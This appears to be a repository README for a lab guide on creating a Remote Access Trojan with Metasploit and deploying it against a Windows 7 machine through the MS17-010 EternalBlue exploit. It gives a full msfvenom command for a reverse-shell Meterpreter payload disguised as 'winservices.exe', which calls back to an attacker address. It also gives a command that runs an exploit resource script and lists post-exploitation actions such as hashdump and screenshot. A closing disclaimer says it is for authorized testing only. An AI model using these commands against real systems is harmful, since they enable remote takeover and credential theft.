# Metasploit RAT Guide

This repository contains a guide for creating and deploying a Remote Access Trojan (RAT) using Metasploit Framework to exploit a Windows 7 virtual machine via the MS17-010 (EternalBlue) vulnerability.

## Files
- `Metasploit_RAT_Guide.docx`: A Word document detailing the steps to create and deploy a RAT.
- `commands.rc`: A Metasploit resource script for exploiting MS17-010.
- `images/`: Screenshots illustrating the process (image1.png to image27.png).

## Usage
1. Read `Metasploit_RAT_Guide.docx` for detailed instructions.
2. Create the Trojan payload:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.206.131 LPORT=4444 -f exe -o winservices.exe

msfconsole -r commands.rc

Use post-exploitation commands like getuid, upload, screenshot, screenshare, hashdump, ps, kill, or reboot.
Steps Overview
Scan the target (Windows 7) with nmap to find open ports.
Create a payload (winservices.exe) using msfvenom.
Exploit MS17-010 using exploit/windows/smb/ms17_010_eternalblue.
Upload and execute the payload to establish a Meterpreter session.
Perform post-exploitation tasks (e.g., screenshot, hashdump, process management).
Screenshots
Nmap scan:
Exploit execution:
Meterpreter session:
(See images/ for all 27 screenshots)
Legal Notice
WARNING: This guide is for educational purposes only. Use Metasploit and related tools only for authorized penetration testing on systems you have explicit permission to test. Unauthorized use is illegal and unethical.

